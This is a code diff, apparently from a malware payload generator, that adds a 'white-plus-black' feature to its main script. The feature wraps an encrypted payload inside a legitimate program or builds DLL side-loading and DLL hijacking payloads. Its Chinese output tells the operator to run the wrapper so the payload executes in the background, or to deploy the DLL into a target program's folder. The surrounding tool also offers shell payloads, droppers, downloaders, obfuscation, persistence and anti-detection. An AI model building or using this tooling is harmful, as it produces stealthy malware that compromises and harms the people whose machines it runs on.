@@ -19,6 +19,7 @@ from modules import (
     AdvancedCipher, gene_advanced_key,
     gene_code, gene_code_obfuscated, advanced_obfuscate_code,
     gene_shell, create_payload_dropper, create_downloader,
+    create_white_black_payload, create_dll_sideloading_payload, create_hijacking_payload,
     validate_ip, validate_port, create_config_file, print_results,
     interactive_mode, command_line_mode
 )
@@ -41,6 +42,8 @@ def main():
                 'persistence': args.persistence,
                 'anti_detection': args.anti_detection,
                 'use_dropper': args.use_dropper,
+                'use_white_black': args.use_white_black,
+                'white_black_mode': args.white_black_mode,
                 'use_downloader': args.use_downloader,
                 'download_url': args.download_url,
                 'downloader_silent': args.downloader_silent,
@@ -160,6 +163,49 @@ def main():
             
             # 打印结果
             print_results(filepath, config_path, key, config, quiet)
+            
+        # 检查是否使用白加黑技术
+        if config.get('use_white_black', False):
+            if not quiet:
+                print("\n🎭 正在生成白加黑载荷...")
+            
+            try:
+                if config['white_black_mode'] == 'wrapper':
+                    # 合法程序包装模式
+                    wb_filepath, wb_description = create_white_black_payload(
+                        encrypted_code, key, config['output_dir'], "auto"
+                    )
+                    if not quiet:
+                        print(f"✅ 白加黑载荷生成成功!")
+                        print(f"📁 白加黑文件: {wb_filepath}")
+                        print(f"📋 包装类型: {wb_description}")
+                        print(f"🎯 使用方法: 直接运行该文件，载荷将在后台执行")
+                
+                elif config['white_black_mode'] == 'sideloading':
+                    # DLL侧加载模式
+                    cpp_file, bat_file = create_dll_sideloading_payload(
+                        encrypted_code, key, config['output_dir']
+                    )
+                    if not quiet:
+                        print(f"✅ DLL侧加载载荷生成成功!")
+                        print(f"📁 源码文件: {cpp_file}")
+                        print(f"📁 编译脚本: {bat_file}")
+                        print(f"🛠️  使用方法: 运行编译脚本生成DLL，然后部署到目标程序目录")
+                
+                elif config['white_black_mode'] == 'hijacking':
+                    # DLL劫持模式
+                    hijack_files = create_hijacking_payload(
+                        encrypted_code, key, config['output_dir']
+                    )
+                    if not quiet:
+                        print(f"✅ DLL劫持载荷生成成功!")
+                        print(f"📁 生成文件数: {len(hijack_files)}")
+                        for file in hijack_files:
+                            print(f"   - {file}")
+                        print(f"📖 查看使用说明: DLL_Hijacking_README.txt")
+                        
+            except Exception as e:
+                print(f"❌ 白加黑载荷生成失败: {str(e)}")
     
     except KeyboardInterrupt:
         print("\n\n❌ 用户中断操作")
